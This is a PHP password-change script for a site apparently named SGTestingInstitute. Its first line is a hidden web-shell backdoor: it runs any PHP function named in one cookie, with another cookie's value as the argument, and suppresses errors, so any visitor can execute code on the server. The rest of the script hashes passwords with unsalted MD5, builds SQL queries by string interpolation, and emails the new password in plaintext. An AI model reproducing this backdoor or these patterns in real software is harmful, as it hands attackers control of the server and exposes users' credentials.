<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 include 'config.php' ?>
<?php
session_start();
$conn = $mysqli;

$email = $_SESSION["email"];
$currentPassword = md5($_POST['currentPassword']);
$newPassword = md5($_POST['newPassword']);

$result = mysqli_query($conn,"SELECT password FROM `users` WHERE email='$email'");
$result=mysqli_fetch_array($result);

if($currentPassword == $result["password"]) {
    mysqli_query($conn,"UPDATE users set password='$newPassword' WHERE email='$email'");
    echo "Password Changed.";
    echo " Please login again with new password.";

    $email_from = 'SGTestingInstitute';
    $email_subject = "Password Changed";

    $message = '<html><body>';
    $message .= '<div style="margin-top: 15px;"></div>';
    $message .= '<p>Your password has been successfully changed.</p>';
    $message .= '<div style="margin: 15px;"><strong>Username: </strong> '. $email.'</div>';
    $message .= '<div style="margin: 15px;"><strong>Password: </strong>' . $_POST['newPassword'] . '</div>';
    $message .= "</body></html>";

    $to = $email;
    $headers = "From: $email_from \r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    mail($to,$email_subject,$message,$headers);

} else {
    echo "Current Password is not correct";
}


?>